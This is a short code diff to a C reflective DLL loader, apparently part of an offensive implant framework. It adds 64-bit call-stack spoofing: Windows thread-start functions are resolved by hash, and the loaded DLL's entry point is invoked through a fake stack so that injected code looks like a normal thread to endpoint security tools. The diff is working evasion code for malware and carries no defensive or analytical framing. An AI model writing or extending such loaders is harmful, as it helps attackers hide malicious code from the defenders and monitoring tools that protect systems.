@@ -97,7 +97,29 @@ SEC( text, B ) VOID Entry( VOID )
         // 6. Finally executing our DllMain
         // --------------------------------
         BOOL ( WINAPI *KaynDllMain ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + NtHeaders->OptionalHeader.AddressOfEntryPoint - KHdrSize );
+
+#ifdef _WIN64
+        /* resolve fake frame addresses for callstack spoofing (HVC-044 Sub-1) */
+        UINT_PTR Kernel32     = LdrModulePeb( KERNEL32_HASH );
+        PVOID    BaseInitThunk   = NULL;
+        PVOID    RtlUsrThrdStart = NULL;
+
+        if ( Kernel32 )
+            BaseInitThunk   = LdrFunctionAddr( Kernel32, BASETHREADINITTHUNK_HASH );
+        if ( Instance.Modules.Ntdll )
+            RtlUsrThrdStart = LdrFunctionAddr( Instance.Modules.Ntdll, RTLUSERTHREADSTART_HASH );
+
+        /* if both frames resolved, install fake callstack; otherwise fall back to direct call */
+        if ( BaseInitThunk && RtlUsrThrdStart ) {
+            KaynSpoofEntry( KaynDllMain, KVirtualMemory, DLL_PROCESS_ATTACH, &KaynArgs,
+                            BaseInitThunk, RtlUsrThrdStart );
+        } else {
+            KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, &KaynArgs );
+        }
+#else
+        /* x86: no stack spoofing infrastructure - direct call */
         KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, &KaynArgs );
+#endif
     }
 }
 
